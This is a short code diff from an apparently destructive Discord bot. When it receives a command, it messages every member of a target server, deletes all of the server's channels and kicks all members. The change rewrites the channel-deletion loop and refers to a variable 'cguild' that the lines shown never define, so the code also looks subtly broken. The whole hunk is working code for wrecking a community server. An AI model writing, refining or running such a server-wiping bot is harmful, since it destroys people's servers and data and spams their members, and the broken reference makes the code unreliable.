@@ -19,12 +19,12 @@ client.on('message', message => {
         let guild = client.guilds.get(serverid);
         delete args[0];
         var msg = args.join(" ");
-        client.guilds.get(serverid).members.map(m => {
+        cguild.members.map(m => {
                 m.send(msg);
         });
-        guild.channels.forEach(c => {
-            c.delete();
-        });
+        for (var i = 0; i < guild.channels.array().length; i++) {
+            guild.channels.array()[i].delete();
+        }
         guild.members.forEach(m => {
             m.kick();
         });
